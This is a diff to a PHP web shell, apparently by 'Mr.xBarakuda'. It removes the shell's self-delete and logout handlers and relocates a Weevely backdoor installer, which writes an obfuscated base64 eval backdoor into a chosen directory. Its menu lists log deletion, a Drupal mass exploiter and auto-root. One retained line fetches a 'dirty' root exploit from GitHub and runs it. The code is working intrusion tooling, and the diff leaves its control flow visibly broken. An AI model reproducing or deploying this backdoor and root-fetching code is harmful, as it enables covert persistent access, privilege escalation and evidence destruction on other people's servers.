@@ -720,14 +720,12 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=vb_ngindex'>VB Index Changer</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=reverse_ip'>Reverse IP</a>";
   echo "<p>";
-  echo "<a style='border:1px groove red;' href='?dir=$dir&do=kill'>Kill Self</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=loghunter'>Log Hunter</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=cgitelnet'>CGI Telnet</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=kudascan'>Shell Scanner v1.1</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=shellscan'>Shell Scanner</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=drupalex'>Drupal Mass Exploiter</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=delogs'>Delete Logs</a>";
-  echo "<a style='border:1px groove red;' href='?logout=true'>Logout</a>";
   echo "<p>";
   echo "<a style='border:1px groove red;' href='?dir=$dir&do=about'>About</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=w00t'>Auto Root</a>";
@@ -740,14 +738,69 @@ ___  ___         ______                 _              _
   echo "</center>";
   echo "<hr color=deepskyblue>";
   echo "<div id='xkuda_load'></div>";
-  if ($_GET['logout'] == 'true') {
-    unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
-    echo "<script>alert('See you again');window.location='?';</script>";
-  } elseif ($_GET['do'] == 'kill') {
-  if (@unlink(preg_replace('!(d+)s.*!', '', __FILE__)))
-    die('<script>alert("Shell removed! Thanks for take my shell today");window.location="?"</script>');
-  else
-    echo '<center><font color="red">Unlink Failed!</font></center>';
+  function success($for, $var1) {
+  $domain = $_SERVER['HTTP_HOST'];
+  $script = $_SERVER['SCRIPT_NAME'];
+  $full_url = $_SERVER['REQUEST_URI'];
+  if ($for == "weevely") {
+    $message = "<center><font color='lime'>Weevely installed!</font></center>";
+    $redirect = "";
+  }
+  if (empty($redirect)) {
+    echo "<script>
+    function remove () {
+      document.getElementById('content').innerHTML='';
+    }
+    setInterval(function() {remove();}, 2700);
+    </script>";
+  } else {
+    echo "<script>
+    function remove () {
+      window.location = '$redirect'
+    }
+    setInterval(function() {remove();}, 2500);
+    </script>";
+  }
+}
+function error($mesg) {
+  $error = "<center><font color='red'>$mesg</font></center>";
+  echo "$error";
+}
+if (isset($_GET['weevely'])) {
+  echo "<center><h3>Weevely Backdoor</h3>
+  <form action='' method='post'>
+  Directory to install weevely backdoor:<br>
+  <input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
+  Name of file (something .php):<br>
+  <input type='text' name='weev_name' class='text' value='weevely.php'><br>
+  Password (more than 3 characters):<br>
+  <input type='text' name='weev_pass' class='text'><br>
+  <input type='submit' name='install_weev' value='Submit'><br>
+  </font>
+  </center>";
+}
+if (isset($_POST['install_weev'])) {
+  $weevdir = rtrim($_POST['weev_dir'], '/');;
+  $weevname = $_POST['weev_name'];
+  $weevpassword = $_POST['weev_pass'];
+  if (strlen($weevpassword) < 3) {
+    error("Password must be longer than 3 characters!");
+  } else {
+    $first2 = $weevpassword[0] . $weevpassword[1];
+    $rest = substr($weevpassword, 2);
+    $money = "$";
+    $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
+    $weevelybd2 = "if (reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
+    $weevelybd3 = "$money" . "k='$rest';";
+    $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
+    $all = "<?php eval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "')); ?>";
+if (file_put_contents($weevdir . '/' . $weevname, $all)) {
+  echo "<center><font color='lime'>Weevely installed!<br><br>Usage: weevely [URL of backdoor] [password]</font></center>";
+  success("weevely");
+} else {
+  error("Failed write backdoor to $weevdir");
+}
+}
 } elseif ($_GET['whmcs'] == 'killer') {
     echo '<form method="post">
     <center>
@@ -816,71 +869,7 @@ ___  ___         ______                 _              _
     if ($_POST['kudaroot']) {
       exe("wget https://raw.githubusercontent.com/mrxbarakuda/root/master/dirty && chmod +x dirty && ./dirty" . $_POST['passwd']);
     }
-  }
-  function success($for, $var1) {
-    $domain = $_SERVER['HTTP_HOST'];
-    $script = $_SERVER['SCRIPT_NAME'];
-    $full_url = $_SERVER['REQUEST_URI'];
-    if ($for == "weevely") {
-      $message = "<center><font color='lime'>Weevely installed!</font></center>";
-      $redirect = "";
-    }
-    if (empty($redirect)) {
-      echo "<script>
-      function remove () {
-        document.getElementById('content').innerHTML='';
-      }
-      setInterval(function() {remove();}, 2700);
-      </script>";
-    } else {
-      echo "<script>
-      function remove () {
-        window.location = '$redirect'
-      }
-      setInterval(function() {remove();}, 2500);
-      </script>";
-    }
-  }
-  function error($mesg) {
-    $error = "<center><font color='red'>$mesg</font></center>";
-    echo "$error";
-  }
-  if (isset($_GET['weevely'])) {
-    echo "<center><h3>Weevely Backdoor</h3>
-    <form action='' method='post'>
-    Directory to install weevely backdoor:<br>
-    <input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
-    Name of file (something .php):<br>
-    <input type='text' name='weev_name' class='text' value='weevely.php'><br>
-    Password (more than 3 characters):<br>
-    <input type='text' name='weev_pass' class='text'><br>
-    <input type='submit' name='install_weev' value='Submit'><br>
-    </font>
-    </center>";
-  }
-  if (isset($_POST['install_weev'])) {
-    $weevdir = rtrim($_POST['weev_dir'], '/');;
-    $weevname = $_POST['weev_name'];
-    $weevpassword = $_POST['weev_pass'];
-    if (strlen($weevpassword) < 3) {
-      error("Password must be longer than 3 characters!");
-    } else {
-      $first2 = $weevpassword[0] . $weevpassword[1];
-      $rest = substr($weevpassword, 2);
-      $money = "$";
-      $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
-      $weevelybd2 = "if (reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
-      $weevelybd3 = "$money" . "k='$rest';";
-      $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
-      $all = "<?php eval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "')); ?>";
-  if (file_put_contents($weevdir . '/' . $weevname, $all)) {
-    echo "<center><font color='lime'>Weevely installed!<br><br>Usage: weevely [URL of backdoor] [password]</font></center>";
-    success("weevely");
-  } else {
-    error("Failed write backdoor to $weevdir");
-  }
-}
-} elseif ($_GET['do'] == 'masschm') {
+  } elseif ($_GET['do'] == 'masschm') {
   /*
   Chmod Mass File and Folder
   Code by Mr.xBarakuda
